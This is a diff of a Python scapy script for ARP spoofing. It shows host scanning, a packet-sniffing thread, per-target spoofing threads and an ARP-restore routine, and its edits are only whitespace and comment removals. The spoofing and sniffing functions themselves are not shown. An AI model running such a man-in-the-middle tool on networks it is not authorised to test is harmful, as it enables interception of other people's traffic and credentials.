@@ -175,7 +175,6 @@ def restore(default_gateway, router_mac, targets):
         ether = scapy.Ether(dst=router_mac)
         packet = ether / arp_response
         scapy.sendp(packet, count=8, verbose=0) 
-
         print(f"Restored connection for {target_ip}")
   
 def pick_targets(default_gateway, mask, target_dict, my_ip):
@@ -205,11 +204,9 @@ def main():
     my_ip=scapy.get_if_addr(scapy.conf.iface)
     my_mac=scapy.get_if_hwaddr(scapy.conf.iface)
     scan(default_gateway, mask, targetdict, my_ip)
-
     # if no devices were found exit the program
     if not targetdict:
         return
-
     # create one sniffer process
     sniffer_proc = threading.Thread(target=sniff_packets, args=(sniff_targets,my_mac),daemon=True)
     sniffer_proc.start()
@@ -226,20 +223,17 @@ def main():
             threads.append(t1)
             threads.append(t2)
             time.sleep(2)
-
-        # wait for all processes to finish
         print("All threads started. Press Ctrl+C to stop.")
-        
         # keep the main thread alive to listen for KeyboardInterrupt
         while True:
             input()
-
     except KeyboardInterrupt:
         print("cntl c was pressed, stopping ARP spoofing and restoring connection..")
         stop_event.set()
         for t in threads[1::]:  # skip the sniffer thread it will exit as its daemon
             t.join()
         restore(default_gateway, router_mac, targets)
+        
 if __name__ == "__main__":
-
     main()
+
